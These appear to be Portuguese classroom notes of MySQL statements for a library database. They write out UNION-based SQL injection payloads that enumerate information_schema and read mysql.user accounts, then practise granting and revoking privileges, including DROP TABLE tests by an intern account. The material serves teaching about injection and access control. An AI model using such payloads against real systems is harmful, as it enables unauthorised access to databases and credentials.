Aula 34 
Professor: Lilian 
Data: 01/09/2025 

USE biblioteca; 

-- SELECT * FROM livros; 
-- SELECT * FROM livros WHERE titulo LIKE "%2%"; 

-- SELECT * FROM livros WHERE titulo LIKE "%2%" UNION SELECT 1,2,3,4,5,6 FROM usuarios; 

-- SELECT * FROM livros WHERE titulo LIKE "%2%" UNION SELECT 1, table_name, 3,4,5,6 FROM information_schema.tables -- %; 

-- SELECT * FROM livros WHERE titulo LIKE "%2%" UNION SELECT 1, column_name, 3,4,5,6 FROM information_schema.columns WHERE table_name = 'usuarios' -- %; 
-- SELECT * FROM livros WHERE titulo LIKE "%" UNION SELECT 1, column_name, 3,4,5,6 FROM information_schema.columns WHERE table_name = 'usuarios' -- %; 
SELECT * FROM livros WHERE titulo LIKE "%" UNION SELECT user, host, 3,4,5,6 FROM mysql.user -- %; 


## Usuários

SELECT * FROM usuarios;
-- SELECT * FROM usuarios WHERE email = 'edmarsinocencio@gmail.com';
-- SELECT * FROM usuarios WHERE email = 'pessoa1@mail.com' && senha = '111111';
-- SELECT * FROM usuarios WHERE email = 'edmarsinocencio@gmail.com' && senha = '123456';





### Novo Usuario / estagiário 

-- CREATE USER 'estagiario'@'localhost' IDENTIFIED BY 'senha123';
-- SELECT user, host FROM mysql.user;
-- SHOW GRANTS FOR 'estagiario'@'localhost';  

-- REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'estagiario'@'localhost';
-- FLUSH PRIVILEGES; 

-- GRANT SELECT, INSERT ON biblioteca.* TO 'estagiario'@'localhost';
-- FLUSH PRIVILEGES; 

SHOW GRANTS FOR 'estagiario'@'localhost'; 



### Estagiário em ação 

USE biblioteca; 

-- UPDATE livros SET disponivel = 1 WHERE id_livro = 1;
-- INSERT INTO autor (nome, sobrenome, nacionalidade) VALUES ('Autor 1', 'Sobrenome do autor', 'Brasil');
SELECT * FROM autor; 
DROP TABLE autor; 


### Novo Usuario / admin 
-- CREATE USER admin
CREATE USER 'admin'@'localost' IDENTIFIED BY 'senha123'; 

GRANT ALL PRIVILEGES ON biblioteca.* TO 'admin'@'localhost'; 
FLUSH PRIVILEGES; 


### Estagiário em ação 
USE biblioteca; 

-- Atualizando estagiario 
-- ALTER USER 'estagiario'@'localhost' IDENTIFIED BY 'novaSenha'; 
-- FLUSH PRIVILEGES; 


-- UPDATE livros SET disponivel = 1 WHERE id_livro = 1;
-- INSERT INTO autor (nome, sobrenome, nacionalidade) VALUES ('Autor 1', 'Sobrenome do autor', 'Brasil');
SELECT * FROM autor; 
DROP TABLE autor; 



GRANT CREATE USER ON *.* TO 'admin'@'localhost' WITH GRANT OPTION; 
FLUSH PRIVILEGES; 
